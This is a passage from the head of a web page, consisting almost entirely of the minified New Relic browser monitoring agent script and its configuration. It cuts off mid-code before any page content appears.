


<!DOCTYPE html>
<html lang="en-us" dir="ltr" prefix="content: http://purl.org/rss/1.0/modules/content/  dc: http://purl.org/dc/terms/  foaf: http://xmlns.com/foaf/0.1/  og: http://ogp.me/ns#  rdfs: http://www.w3.org/2000/01/rdf-schema#  schema: http://schema.org/  sioc: http://rdfs.org/sioc/ns#  sioct: http://rdfs.org/sioc/types#  skos: http://www.w3.org/2004/02/skos/core#  xsd: http://www.w3.org/2001/XMLSchema# " class="page-en">
  <head>
    <script type="text/javascript">(window.NREUM||(NREUM={})).init={privacy:{cookies_enabled:true},ajax:{deny_list:["bam.nr-data.net"]},distributed_tracing:{enabled:true}};(window.NREUM||(NREUM={})).loader_config={agentID:"1120369191",accountID:"6363336",trustKey:"6363336",xpid:"UgUBUlVQDhAJXFBWAAEAUlE=",licenseKey:"NRJS-dc609d42ed81d429509",applicationID:"981470745"};;/*! For license information please see nr-loader-spa-1.296.0.min.js.LICENSE.txt */
(()=>{var e,t,r={8122:(e,t,r)=>{"use strict";r.d(t,{a:()=>i});var n=r(944);function i(e,t){try{if(!e||"object"!=typeof e)return(0,n.R)(3);if(!t||"object"!=typeof t)return(0,n.R)(4);const r=Object.create(Object.getPrototypeOf(t),Object.getOwnPropertyDescriptors(t)),o=0===Object.keys(r).length?e:r;for(let a in o)if(void 0!==e[a])try{if(null===e[a]){r[a]=null;continue}Array.isArray(e[a])&&Array.isArray(t[a])?r[a]=Array.from(new Set([...e[a],...t[a]])):"object"==typeof e[a]&&"object"==typeof t[a]?r[a]=i(e[a],t[a]):r[a]=e[a]}catch(e){r[a]||(0,n.R)(1,e)}return r}catch(e){(0,n.R)(2,e)}}},2555:(e,t,r)=>{"use strict";r.d(t,{D:()=>s,f:()=>a});var n=r(384),i=r(8122);const o={beacon:n.NT.beacon,errorBeacon:n.NT.errorBeacon,licenseKey:void 0,applicationID:void 0,sa:void 0,queueTime:void 0,applicationTime:void 0,ttGuid:void 0,user:void 0,account:void 0,product:void 0,extra:void 0,jsAttributes:{},userAttributes:void 0,atts:void 0,transactionName:void 0,tNamePlain:void 0};function a(e){try{return!!e.licenseKey&&!!e.errorBeacon&&!!e.applicationID}catch(e){return!1}}const s=e=>(0,i.a)(e,o)},9324:(e,t,r)=>{"use strict";r.d(t,{F3:()=>i,Xs:()=>o,Yq:()=>a,xv:()=>n});const n="1.296.0",i="PROD",o="CDN",a="^2.0.0-alpha.18"},6154:(e,t,r)=>{"use strict";r.d(t,{A4:()=>s,OF:()=>d,RI:()=>i,WN:()=>h,bv:()=>o,gm:()=>a,lR:()=>f,m:()=>u,mw:()=>c,sb:()=>l});var n=r(1863);const i="undefined"!=typeof window&&!!window.document,o="undefined"!=typeof WorkerGlobalScope&&("undefined"!=typeof self&&self instanceof WorkerGlobalScope&&self.navigator instanceof WorkerNavigator||"undefined"!=typeof globalThis&&globalThis instanceof WorkerGlobalScope&&globalThis.navigator instanceof WorkerNavigator),a=i?window:"undefined"!=typeof WorkerGlobalScope&&("undefined"!=typeof self&&self instanceof WorkerGlobalScope&&self||"undefined"!=typeof globalThis&&globalThis instanceof WorkerGlobalScope&&globalThis),s="complete"===a?.document?.readyState,c=Boolean("hidden"===a?.document?.visibilityState),u=""+a?.location,d=/iPad|iPhone|iPod/.test(a.navigator?.userAgent),l=d&&"undefined"==typeof SharedWorker,f=(()=>{const e=a.navigator?.userAgent?.match(/Firefox[/\s](\d+\.\d+)/);return Array.isArray(e)&&e.length>=2?+e[1]:0})(),h=Date.now()-(0,n.t)()},7295:(e,t,r)=>{"use strict";r.d(t,{Xv:()=>a,gX:()=>i,iW:()=>o});var n=[];function i(e){if(!e||o(e))return!1;if(0===n.length)return!0;for(var t=0;t<n.length;t++){var r=n[t];if("*"===r.hostname)return!1;if(s(r.hostname,e.hostname)&&c(r.pathname,e.pathname))return!1}return!0}function o(e){return void 0===e.hostname}function a(e){if(n=[],e&&e.length)for(var t=0;t<e.length;t++){let r=e[t];if(!r)continue;0===r.indexOf("http://")?r=r.substring(7):0===r.indexOf("https://")&&(r=r.substring(8));const i=r.indexOf("/");let o,a;i>0?(o=r.substring(0,i),a=r.substring(i)):(o=r,a="");let[s]=o.split(":");n.push({hostname:s,pathname:a})}}function s(e,t){return!(e.length>t.length)&&t.indexOf(e)===t.length-e.length}function c(e,t){return 0===e.indexOf("/")&&(e=e.substring(1)),0===t.indexOf("/")&&(t=t.substring(1)),""===e||e===t}},3241:(e,t,r)=>{"use strict";r.d(t,{W:()=>o});var n=r(6154);const i="newrelic";function o(e={}){try{n.gm.dispatchEvent(new CustomEvent(i,{detail:e}))}catch(e){}}},1687:(e,t,r)=>{"use strict";r.d(t,{Ak:()=>u,Ze:()=>f,x3:()=>d});var n=r(3241),i=r(7836),o=r(3606),a=r(860),s=r(2646);const c={};function u(e,t){const r={staged:!1,priority:a.P3[t]||0};l(e),c[e].get(t)||c[e].set(t,r)}function d(e,t){e&&c[e]&&(c[e].get(t)&&c[e].delete(t),p(e,t,!1),c[e].size&&h(e))}function l(e){if(!e)throw new Error("agentIdentifier required");c[e]||(c[e]=new Map)}function f(e="",t="feature",r=!1){if(l(e),!e||!c[e].get(t)||r)return p(e,t);c[e].get(t).staged=!0,h(e)}function h(e){const t=Array.from(c[e]);t.every((([e,t])=>t.staged))&&(t.sort(((e,t)=>e[1].priority-t[1].priority)),t.forEach((([t])=>{c[e].delete(t),p(e,t)})))}function p(e,t,r=!0){const a=e?i.ee.get(e):i.ee,c=o.i.handlers;if(!a.aborted&&a.backlog&&c){if((0,n.W)({agentIdentifier:e,type:"lifecycle",name:"drain",feature:t}),r){const e=a.backlog[t],r=c[t];if(r){for(let t=0;e&&t<e.length;++t)g(e[t],r);Object.entries(r).forEach((([e,t])=>{Object.values(t||{}).forEach((t=>{t[0]?.on&&t[0]?.context()instanceof s.y&&t[0].on(e,t[1])}))}))}}a.isolatedBacklog||delete c[t],a.backlog[t]=null,a.emit("drain-"+t,[])}}function g(e,t){var r=e[1];Object.values(t[r]||{}).forEach((t=>{var r=e[0];if(t[0]===r){var n=t[1],i=e[3],o=e[2];n.apply(i,o)}}))}},7836:(e,t,r)=>{"use strict";r.d(t,{P:()=>s,ee:()=>c});var n=r(384),i=r(8990),o=r(2646),a=r(5607);const s="nr@context:".concat(a.W),c=function e(t,r){var n={},a={},d={},l=!1;try{l=16===r.length&&u.initializedAgents?.[r]?.runtime.isolatedBacklog}catch(e){}var f={on:p,addEventListener:p,removeEventListener:function(e,t){var r=n[e];if(!r)return;for(var i=0;i<r.length;i++)r[i]===t&&r.splice(i,1)},emit:function(e,r,n,i,o){!1!==o&&(o=!0);if(c.aborted&&!i)return;t&&o&&t.emit(e,r,n);var s=h(n);g(e).forEach((e=>{e.apply(s,r)}));var u=v()[a[e]];u&&u.push([f,e,r,s]);return s},get:m,listeners:g,context:h,buffer:function(e,t){const r=v();if(t=t||"feature",f.aborted)return;Object.entries(e||{}).forEach((([e,n])=>{a[n]=t,t in r||(r[t]=[])}))},abort:function(){f._aborted=!0,Object.keys(f.backlog).forEach((e=>{delete f.backlog[e]}))},isBuffering:function(e){return!!v()[a[e]]},debugId:r,backlog:l?{}:t&&"object"==typeof t.backlog?t.backlog:{},isolatedBacklog:l};return Object.defineProperty(f,"aborted",{get:()=>{let e=f._aborted||!1;return e||(t&&(e=t.aborted),e)}}),f;function h(e){return e&&e instanceof o.y?e:e?(0,i.I)(e,s,(()=>new o.y(s))):new o.y(s)}function p(e,t){n[e]=g(e).concat(t)}function g(e){return n[e]||[]}function m(t){return d[t]=d[t]||e(f,t)}function v(){return f.backlog}}(void 0,"globalEE"),u=(0,n.Zm)();u.ee||(u.ee=c)},2646:(e,t,r)=>{"use strict";r.d(t,{y:()=>n});class n{constructor(e){this.contextId=e}}},9908:(e,t,r)=>{"use strict";r.d(t,{d:()=>n,p:()=>i});var n=r(7836).ee.get("handle");function i(e,t,r,i,o){o?(o.buffer([e],i),o.emit(e,t,r)):(n.buffer([e],i),n.emit(e,t,r))}},3606:(e,t,r)=>{"use strict";r.d(t,{i:()=>o});var n=r(9908);o.on=a;var i=o.handlers={};function o(e,t,r,o){a(o||n.d,i,e,t,r)}function a(e,t,r,i,o){o||(o="feature"),e||(e=n.d);var a=t[o]=t[o]||{};(a[r]=a[r]||[]).push([e,i])}},3878:(e,t,r)=>{"use strict";function n(e,t){return{capture:e,passive:!1,signal:t}}function i(e,t,r=!1,i){window.addEventListener(e,t,n(r,i))}function o(e,t,r=!1,i){document.addEventListener(e,t,n(r,i))}r.d(t,{DD:()=>o,jT:()=>n,sp:()=>i})},5607:(e,t,r)=>{"use strict";r.d(t,{W:()=>n});const n=(0,r(9566).bz)()},9566:(e,t,r)=>{"use strict";r.d(t,{LA:()=>s,ZF:()=>c,bz:()=>a,el:()=>u});var n=r(6154);const i="xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx";function o(e,t){return e?15&e[t]:16*Math.random()|0}function a(){const e=n.gm?.crypto||n.gm?.msCrypto;let t,r=0;return e&&e.getRandomValues&&(t=e.getRandomValues(new Uint8Array(30))),i.split("").map((e=>"x"===e?o(t,r++).toString(16):"y"===e?(3&o()|8).toString(16):e)).join("")}function s(e){const t=n.gm?.crypto||n.gm?.msCrypto;let r,i=0;t&&t.getRandomValues&&(r=t.getRandomValues(new Uint8Array(e)));const a=[];for(var s=0;s<e;s++)a.push(o(r,i++).toString(16));return a.join("")}function c(){return s(16)}function u(){return s(32)}},2614:(e,t,r)=>{"use strict";r.d(t,{BB:()=>a,H3:()=>n,g:()=>u,iL:()=>c,tS:()=>s,uh:()=>i,wk:()=>o});const n="NRBA",i="SESSION",o=144e5,a=18e5,s={STARTED:"session-started",PAUSE:"session-pause",RESET:"session-reset",RESUME:"session-resume",UPDATE:"session-update"},c={SAME_TAB:"same-tab",CROSS_TAB:"cross-tab"},u={OFF:0,FULL:1,ERROR:2}},1863:(e,t,r)=>{"use strict";function n(){return Math.floor(performance.now())}r.d(t,{t:()=>n})},7485:(e,t,r)=>{"use strict";r.d(t,{D:()=>i});var n=r(6154);function i(e){if(0===(e||"").indexOf("data:"))return{protocol:"data"};try{const t=new URL(e,location.href),r={port:t.port,hostname:t.hostname,pathname:t.pathname,search:t.search,protocol:t.protocol.slice(0,t.protocol.indexOf(":")),sameOrigin:t.protocol===n.gm?.location?.protocol&&t.host===n.gm?.location?.host};return r.port&&""!==r.port||("http:"===t.protocol&&(r.port="80"),"https:"===t.protocol&&(r.port="443")),r.pathname&&""!==r.pathname?r.pathname.startsWith("/")||(r.pathname="/".concat(r.pathname)):r.pathname="/",r}catch(e){return{}}}},944:(e,t,r)=>{"use strict";r.d(t,{R:()=>i});var n=r(3241);function i(e,t){"function"==typeof console.debug&&(console.debug("New Relic Warning: https://github.com/newrelic/newrelic-browser-agent/blob/main/docs/warning-codes.md#".concat(e),t),(0,n.W)({agentIdentifier:null,drained:null,type:"data",name:"warn",feature:"warn",data:{code:e,secondary:t}}))}},5701:(e,t,r)=>{"use strict";r.d(t,{B:()=>o,t:()=>a});var n=r(3241);const i=new Set,o={};function a(e,t){const r=t.agentIdentifier;o[r]??={},e&&"object"==typeof e&&(i.has(r)||(t.ee.emit("rumresp",[e]),o[r]=e,i.add(r),(0,n.W)({agentIdentifier:r,loaded:!0,drained:!0,type:"lifecycle",name:"load",feature:void 0,data:e})))}},8990:(e,t,r)=>{"use strict";r.d(t,{I:()=>i});var n=Object.prototype.hasOwnProperty;function i(e,t,r){if(n.call(e,t))return e[t];var i=r();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(e,t,{value:i,writable:!0,enumerable:!1}),i}catch(e){}return e[t]=i,i}},6389:(e,t,r)=>{"use strict";function n(e,t=500,r={}){const n=r?.leading||!1;let i;return(...r)=>{n&&void 0===i&&(e.apply(this,r),i=setTimeout((()=>{i=clearTimeout(i)}),t)),n||(clearTimeout(i),i=setTimeout((()=>{e.apply(this,r)}),t))}}function i(e){let t=!1;return(...r)=>{t||(t=!0,e.apply(this,r))}}r.d(t,{J:()=>i,s:()=>n})},1910:(e,t,r)=>{"use strict";r.d(t,{i:()=>o});var n=r(944);const i=new Map;function o(...e){return e.every((e=>{if(i.has(e))return i.get(e);const t="function"==typeof e&&e.toString().includes("[native code]");return t||(0,n.R)(64,e?.name||e?.toString()),i.set(e,t),t}))}},3304:(e,t,r)=>{"use strict";r.d(t,{A:()=>o});var n=r(7836);const i=()=>{const e=new WeakSet;return(t,r)=>{if("object"==typeof r&&null!==r){if(e.has(r))return;e.add(r)}return r}};function o(e){try{return JSON.stringify(e,i())??""}catch(e){try{n.ee.emit("internal-error",[e])}catch(e){}return""}}},3496:(e,t,r)=>{"use strict";function n(e){return!e||!(!e.licenseKey||!e.applicationID)}function i(e,t){return!e||e.licenseKey===t.info.licenseKey&&e.applicationID===t.info.applicationID}r.d(t,{A:()=>i,I:()=>n})},5289:(e,t,r)=>{"use strict";r.d(t,{GG:()=>o,Qr:()=>s,sB:()=>a});var n=r(3878);function i(){return"undefined"==typeof document||"complete"===document.readyState}function o(e,t){if(i())return e();(0,n.sp)("load",e,t)}function a(e){if(i())return e();(0,n.DD)("DOMContentLoaded",e)}function s(e){if(i())return e();(0,n.sp)("popstate",e)}},384:(e,t,r)=>{"use strict";r.d(t,{NT:()=>a,US:()=>d,Zm:()=>s,bQ:()=>u,dV:()=>c,pV:()=>l});var n=r(6154),i=r(1863),o=r(1910);const a={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net"};function s(){return n.gm.NREUM||(n.gm.NREUM={}),void 0===n.gm.newrelic&&(n.gm.newrelic=n.gm.NREUM),n.gm.NREUM}function c(){let e=s();return e.o||(e.o={ST:n.gm.setTimeout,SI:n.gm.setImmediate||n.gm.setInterval,CT:n.gm.clearTimeout,XHR:n.gm.XMLHttpRequest,REQ:n.gm.Request,EV:n.gm.Event,PR:n.gm.Promise,MO:n.gm.MutationObserver,FETCH:n.gm.fetch,WS:n.gm.WebSocket},(0,o.i)(...Object.values(e.o))),e}function u(e,t){let r=s();r.initializedAgents??={},t.initializedAt={ms:(0,i.t)(),date:new Date},r.initializedAgents[e]=t}function d(e,t){s()[e]=t}function l(){return function(){let e=s();const t=e.info||{};e.info={beacon:a.beacon,errorBeacon:a.errorBeacon,...t}}(),function(){let e=s();const t=e.init||{};e.init={...t}}(),c(),function(){let e=s();const t=e.loader_config||{};e.loader_config={...t}}(),s()}},2843:(e,t,r)=>{"use strict";r.d(t,{u:()=>i});var n=r(3878);function i(e,t=!1,r,i){(0,n.DD)("visibilitychange",(function(){if(t)return void("hidden"===document.visibilityState&&e());e(document.visibilityState)}),r,i)}},8139:(e,t,r)=>{"use strict";r.d(t,{u:()=>f});var n=r(7836),i=r(3434),o=r(8990),a=r(6154);const s={},c=a.gm.XMLHttpRequest,u="addEventListener",d="removeEventListener",l="nr@wrapped:".concat(n.P);function f(e){var t=function(e){return(e||n.ee).get("events")}(e);if(s[t.debugId]++)return t;s[t.debugId]=1;var r=(0,i.YM)(t,!0);function f(e){r.inPlace(e,[u,d],"-",p)}function p(e,t){return e[1]}return"getPrototypeOf"in Object&&(a.RI&&h(document,f),c&&h(c.prototype,f),h(a.gm,f)),t.on(u+"-start",(function(e,t){var n=e[1];if(null!==n&&("function"==typeof n||"object"==typeof n)&&"newrelic"!==e[0]){var i=(0,o.I)(n,l,(function(){var e={object:function(){if("function"!=typeof n.handleEvent)return;return n.handleEvent.apply(n,arguments)},function:n}[typeof n];return e?r(e,"fn-",null,e.name||"anonymous"):n}));this.wrapped=e[1]=i}})),t.on(d+"-start",(function(e){e[1]=this.wrapped||e[1]})),t}function h(e,t,...r){let n=e;for(;"object"==typeof n&&!Object.prototype.hasOwnProperty.call(n,u);)n=Object.getPrototypeOf(n);n&&t(n,...r)}},3434:(e,t,r)=>{"use strict";r.d(t,{Jt:()=>o,YM:()=>c});var n=r(7836),i=r(5607);const o="nr@original:".concat(i.W);var a=Object.prototype.hasOwnProperty,s=!1;function c(e,t){return e||(e=n.ee),r.inPlace=function(e,t,n,i,o){n||(n="");const a="-"===n.charAt(0);for(let s=0;s<t.length;s++){const c=t[s],u=e[c];d(u)||(e[c]=r(u,a?c+n:n,i,c,o))}},r.flag=o,r;function r(t,r,n,s,c){return d(t)?t:(r||(r=""),nrWrapper[o]=t,function(e,t,r){if(Object.defineProperty&&Object.keys)try{return Object.keys(e).forEach((function(r){Object.defineProperty(t,r,{get:function(){return e[r]},set:function(t){return e[r]=t,t}})})),t}catch(e){u([e],r)}for(var n in e)a.call(e,n)&&(t[n]=e[n])}(t,nrWrapper,e),nrWrapper);function nrWrapper(){var o,a,d,l;let f;try{a=this,o=[...arguments],d="function"==typeof n?n(o,a):n||{}}catch(t){u([t,"",[o,a,s],d],e)}i(r+"start",[o,a,s],d,c);const h=performance.now();let p=h;try{return l=t.apply(a,o),p=performance.now(),l}catch(e){throw p=performance.now(),i(r+"err",[o,a,e],d,c),f=e,f}finally{const e=p-h,t={duration:e,isLongTask:e>=50,methodName:s,thrownError:f};t.isLongTask&&i("long-task",[t],d,c),i(r+"end",[o,a,l,t],d,c)}}}function i(r,n,i,o){if(!s||t){var a=s;s=!0;try{e.emit(r,n,i,t,o)}catch(t){u([t,r,n,i],e)}s=a}}}function u(e,t){t||(t=n.ee);try{t.emit("internal-error",e)}catch(e){}}function d(e){return!(e&&"function"==typeof e&&e.apply&&!e[o])}},9300:(e,t,r)=>{"use strict";r.d(t,{T:()=>n});const n=r(860).K7.ajax},3333:(e,t,r)=>{"use strict";r.d(t,{$v:()=>u,TZ:()=>n,Zp:()=>i,kd:()=>c,mq:()=>s,nf:()=>a,qN:()=>o});const n=r(860).K7.genericEvents,i=["auxclick","click","copy","keydown","paste","scrollend"],o=["focus","blur"],a=4,s=1e3,c=["PageAction","UserAction","BrowserPerformance"],u={MARKS:"experimental.marks",MEASURES:"experimental.measures",RESOURCES:"experimental.resources"}},6774:(e,t,r)=>{"use strict";r.d(t,{T:()=>n});const n=r(860).K7.jserrors},993:(e,t,r)=>{"use strict";r.d(t,{A$:()=>o,ET:()=>a,TZ:()=>s,p_:()=>i});var n=r(860);const i={ERROR:"ERROR",WARN:"WARN",INFO:"INFO",DEBUG:"DEBUG",TRACE:"TRACE"},o={OFF:0,ERROR:1,WARN:2,INFO:3,DEBUG:4,TRACE:5},a="log",s=n.K7.logging},3785:(e,t,r)=>{"use strict";r.d(t,{R:()=>c,b:()=>u});var n=r(9908),i=r(1863),o=r(860),a=r(8154),s=r(993);function c(e,t,r={},c=s.p_.INFO,u,d=(0,i.t)()){(0,n.p)(a.xV,["API/logging/".concat(c.toLowerCase(),"/called")],void 0,o.K7.metrics,e),(0,n.p)(s.ET,[d,t,r,c,u],void 0,o.K7.logging,e)}function u(e){return"string"==typeof e&&Object.values(s.p_).some((t=>t===e.toUpperCase().trim()))}},8154:(e,t,r)=>{"use strict";r.d(t,{z_:()=>o,XG:()=>s,TZ:()=>n,rs:()=>i,xV:()=>a});r(6154),r(9566),r(384);const n=r(860).K7.metrics,i="sm",o="cm",a="storeSupportabilityMetrics",s="storeEventMetrics"},6630:(e,t,r)=>{"use strict";r.d(t,{T:()=>n});const n=r(860).K7.pageViewEvent},782:(e,t,r)=>{"use strict";r.d(t,{T:()=>n});const n=r(860).K7.pageViewTiming},6344:(e,t,r)=>{"use strict";r.d(t,{BB:()=>d,G4:()=>o,Qb:()=>l,TZ:()=>i,Ug:()=>a,_s:()=>s,bc:()=>u,yP:()=>c});var n=r(2614);const i=r(860).K7.sessionReplay,o={RECORD:"recordReplay",PAUSE:"pauseReplay",ERROR_DURING_REPLAY:"errorDuringReplay"},a=.12,s={DomContentLoaded:0,Load:1,FullSnapshot:2,IncrementalSnapshot:3,Meta:4,Custom:5},c={[n.g.ERROR]:15e3,[n.g.FULL]:3e5,[n.g.OFF]:0},u={RESET:{message:"Session was reset",sm:"Reset"},IMPORT:{message:"Recorder failed to import",sm:"Import"},TOO_MANY:{message:"429: Too Many Requests",sm:"Too-Many"},TOO_BIG:{message:"Payload was too large",sm:"Too-Big"},CROSS_TAB:{message:"Session Entity was set to OFF on another tab",sm:"Cross-Tab"},ENTITLEMENTS:{message:"Session Replay is not allowed and will not be started",sm:"Entitlement"}},d=5e3,l={API:"api"}},5270:(e,t,r)=>{"use strict";r.d(t,{Aw:()=>s,CT:()=>c,SR:()=>a,rF:()=>u});var n=r(384),i=r(7767),o=r(6154);function a(e){return!!(0,n.dV)().o.MO&&(0,i.V)(e)&&!0===e?.session_trace.enabled}function s(e){return!0===e?.session_replay.preload&&a(e)}function c(e,t){const r=t.correctAbsoluteTimestamp(e);return{originalTimestamp:e,correctedTimestamp:r,timestampDiff:e-r,originTime:o.WN,correctedOriginTime:t.correctedOriginTime,originTimeDiff:Math.floor(o.WN-t.correctedOriginTime)}}function u(e,t){try{if("string"==typeof t?.type){if("password"===t.type.toLowerCase())return"*".repeat(e?.length||0);if(void 0!==t?.dataset?.nrUnmask||t?.classList?.contains("nr-unmask"))return e}}catch(e){}return"string"==typeof e?e.replace(/[\S]/g,"*"):"*".repeat(e?.length||0)}},3738:(e,t,r)=>{"use strict";r.d(t,{He:()=>i,Kp:()=>s,Lc:()=>u,Rz:()=>d,TZ:()=>n,bD:()=>o,d3:()=>a,jx:()=>l,sl:()=>f,uP:()=>c});const n=r(860).K7.sessionTrace,i="bstResource",o="resource",a="-start",s="-end",c="fn"+a,u="fn"+s,d="pushState",l=1e3,f=3e4},3962:(e,t,r)=>{"use strict";r.d(t,{AM:()=>o,O2:()=>c,Qu:()=>u,TZ:()=>s,ih:()=>d,pP:()=>a,tC:()=>i});var n=r(860);const i=["click","keydown","submit","popstate"],o="api",a="initialPageLoad",s=n.K7.softNav,c={INITIAL_PAGE_LOAD:"",ROUTE_CHANGE:1,UNSPECIFIED:2},u={INTERACTION:1,AJAX:2,CUSTOM_END:3,CUSTOM_TRACER:4},d={IP:"in progress",FIN:"finished",CAN:"cancelled"}},7378:(e,t,r)=>{"use strict";r.d(t,{$p:()=>x,BR:()=>b,Kp:()=>R,L3:()=>y,Lc:()=>c,NC:()=>o,SG:()=>d,TZ:()=>i,U6:()=>p,UT:()=>m,d3:()=>w,dT:()=>f,e5:()=>A,gx:()=>v,l9:()=>l,oW:()=>h,op:()=>g,rw:()=>u,tH:()=>E,uP:()=>s,wW:()=>T,xq:()=>a});var n=r(384);const i=r(860).K7.spa,o=["click","submit","keypress","keydown","keyup","change"],a=999,s="fn-start",c="fn-end",u="cb-start",d="api-ixn-",l="remaining",f="interaction",h="spaNode",p="jsonpNode",g="fetch-start",m="fetch-done",v="fetch-body-",b="jsonp-end",y=(0,n.dV)().o.ST,w="-start",R="-end",x="-body",T="cb"+R,A="jsTime",E="fetch"},4234:(e,t,r)=>{"use strict";r.d(t,{W:()=>o});var n=r(7836),i=r(1687);class o{constructor(e,t){this.agentIdentifier=e,this.ee=n.ee.get(e),this.featureName=t,this.blocked=!1}deregisterDrain(){(0,i.x3)(this.agentIdentifier,this.featureName)}}},7767:(e,t,r)=>{"use strict";r.d(t,{V:()=>i});var n=r(6154);const i=e=>n.RI&&!0===e?.privacy.cookies_enabled},1741:(e,t,r)=>{"use strict";r.d(t,{W:()=>o});var n=r(944),i=r(4261);class o{#e(e,...t){if(this[e]!==o.prototype[e])return this[e](...t);(0,n.R)(35,e)}addPageAction(e,t){return this.#e(i.hG,e,t)}register(e){return this.#e(i.eY,e)}recordCustomEvent(e,t){return this.#e(i.fF,e,t)}setPageViewName(e,t){return this.#e(i.Fw,e,t)}setCustomAttribute(e,t,r){return this.#e(i.cD,e,t,r)}noticeError(e,t){return this.#e(i.o5,e,t)}setUserId(e){return this.#e(i.Dl,e)}setApplicationVersion(e){return this.#e(i.nb,e)}setErrorHandler(e){return this.#e(i.bt,e)}addRelease(e,t){return this.#e(i.k6,e,t)}log(e,t){return this.#e(i.$9,e,t)}start(){return this.#e(i.d3)}finished(e){return this.#e(i.BL,e)}recordReplay(){return this.#e(i.CH)}pauseReplay(){return this.#e(i.Tb)}addToTrace(e){return this.#e(i.U2,e)}setCurrentRouteName(e){return this.#e(i.PA,e)}interaction(){return this.#e(i.dT)}wrapLogger(e,t,r){return this.#e(i.Wb,e,t,r)}measure(e,t){return this.#e(i.V1,e,t)}}},4261:(e,t,r)=>{"use strict";r.d(t,{$9:()=>d,BL:()=>c,CH:()=>p,Dl:()=>R,Fw:()=>w,PA:()=>v,Pl:()=>n,Tb:()=>f,U2:()=>a,V1:()=>A,Wb:()=>T,bt:()=>y,cD:()=>b,d3:()=>x,dT:()=>u,eY:()=>g,fF:()=>h,hG:()=>o,hw:()=>i,k6:()=>s,nb:()=>m,o5:()=>l});const n="api-",i=n+"ixn-",o="addPageAction",a="addToTrace",s="addRelease",c="finished",u="interaction",d="log",l="noticeError",f="pauseReplay",h="recordCustomEvent",p="recordReplay",g="register",m="setApplicationVersion",v="setCurrentRouteName",b="setCustomAttribute",y="setErrorHandler",w="setPageViewName",R="setUserId",x="start",T="wrapLogger",A="measure"},5205:(e,t,r)=>{"use strict";r.d(t,{j:()=>S});var n=r(384),i=r(1741);var o=r(2555),a=r(3333);const s=e=>{if(!e||"string"!=typeof e)return!1;try{document.createDocumentFragment().querySelector(e)}catch{return!1}return!0};var c=r(2614),u=r(944),d=r(8122);const l="[data-nr-mask]",f=e=>(0,d.a)(e,(()=>{const e={feature_flags:[],experimental:{marks:!1,measures:!1,resources:!1},mask_selector:"*",block_selector:"[data-nr-block]",mask_input_options:{color:!1,date:!1,"datetime-local":!1,email:!1,month:!1,number:!1,range:!1,search:!1,tel:!1,text:!1,time:!1,url:!1,week:!1,textarea:!1,select:!1,password:!0}};return{ajax:{deny_list:void 0,block_internal:!0,enabled:!0,autoStart:!0},api:{allow_registered_children:!0,duplicate_registered_data:!1},distributed_tracing:{enabled:void 0,exclude_newrelic_header:void 0,cors_use_newrelic_header:void 0,cors_use_tracecontext_headers:void 0,allowed_origins:void 0},get feature_flags(){return e.feature_flags},set feature_flags(t){e.feature_flags=t},generic_events:{enabled:!0,autoStart:!0},harvest:{interval:30},jserrors:{enabled:!0,autoStart:!0},logging:{enabled:!0,autoStart:!0},metrics:{enabled:!0,autoStart:!0},obfuscate:void 0,page_action:{enabled:!0},page_view_event:{enabled:!0,autoStart:!0},page_view_timing:{enabled:!0,autoStart:!0},performance:{get capture_marks(){return e.feature_flags.includes(a.$v.MARKS)||e.experimental.marks},set capture_marks(t){e.experimental.marks=t},get capture_measures(){return e.feature_flags.includes(a.$v.MEASURES)||e.experimental.measures},set capture_measures(t){e.experimental.measures=t},capture_detail:!0,resources:{get enabled(){return e.feature_flags.includes(a.$v.RESOURCES)||e.experimental.resources},set enabled(t){e.experimental.resources=t},asset_types:[],first_party_domains:[],ignore_newrelic:!0}},privacy:{cookies_enabled:!0},proxy:{assets:void 0,beacon:void 0},session:{expiresMs:c.wk,inactiveMs:c.BB},session_replay:{autoStart:!0,enabled:!1,preload:!1,sampling_rate:10,error_sampling_rate:100,collect_fonts:!1,inline_images:!1,fix_stylesheets:!0,mask_all_inputs:!0,get mask_text_selector(){return e.mask_selector},set mask_text_selector(t){s(t)?e.mask_selector="".concat(t,",").concat(l):""===t||null===t?e.mask_selector=l:(0,u.R)(5,t)},get block_class(){return"nr-block"},get ignore_class(){return"nr-ignore"},get mask_text_class(){return"nr-mask"},get block_selector(){return e.block_selector},set block_selector(t){s(t)?e.block_selector+=",".concat(t):""!==t&&(0,u.R)(6,t)},get mask_input_options(){return e.mask_input_options},set mask_input_options(t){t&&"object"==typeof t?e.mask_input_options={...t,password:!0}:(0,u.R)(7,t)}},session_trace:{enabled:!0,autoStart:!0},soft_navigations:{enabled:!0,autoStart:!0},spa:{enabled:!0,autoStart:!0},ssl:void 0,user_actions:{enabled:!0,elementAttributes:["id","className","tagName","type"]}}})());var h=r(6154),p=r(9324);let g=0;const m={buildEnv:p.F3,distMethod:p.Xs,version:p.xv,originTime:h.WN},v={appMetadata:{},customTransaction:void 0,denyList:void 0,disabled:!1,entityManager:void 0,harvester:void 0,isolatedBacklog:!1,isRecording:!1,loaderType:void 0,maxBytes:3e4,obfuscator:void 0,onerror:void 0,ptid:void 0,releaseIds:{},session:void 0,timeKeeper:void 0,jsAttributesMetadata:{bytes:0},get harvestCount(){return++g}},b=e=>{const t=(0,d.a)(e,v),r=Object.keys(m).reduce(((e,t)=>(e[t]={value:m[t],writable:!1,configurable:!0,enumerable:!0},e)),{});return Object.defineProperties(t,r)};var y=r(5701);const w=e=>{const t=e.startsWith("http");e+="/",r.p=t?e:"https://"+e};var R=r(7836),x=r(3241);const T={accountID:void 0,trustKey:void 0,agentID:void 0,licenseKey:void 0,applicationID:void 0,xpid:void 0},A=e=>(0,d.a)(e,T),E=new Set;function S(e,t={},r,a){let{init:s,info:c,loader_config:u,runtime:d={},exposed:l=!0}=t;if(!c){const e=(0,n.pV)();s=e.init,c=e.info,u=e.loader_config}e.init=f(s||{}),e.loader_config=A(u||{}),c.jsAttributes??={},h.bv&&(c.jsAttributes.isWorker=!0),e.info=(0,o.D)(c);const p=e.init,g=[c.beacon,c.errorBeacon];E.has(e.agentIdentifier)||(p.proxy.assets&&(w(p.proxy.assets),g.push(p.proxy.assets)),p.proxy.beacon&&g.push(p.proxy.beacon),function(e){const t=(0,n.pV)();Object.getOwnPropertyNames(i.W.prototype).forEach((r=>{const n=i.W.prototype[r];if("function"!=typeof n||"constructor"===n)return;let o=t[r];e[r]&&!1!==e.exposed&&"micro-agent"!==e.runtime?.loaderType&&(t[r]=(...t)=>{const n=e[r](...t);return 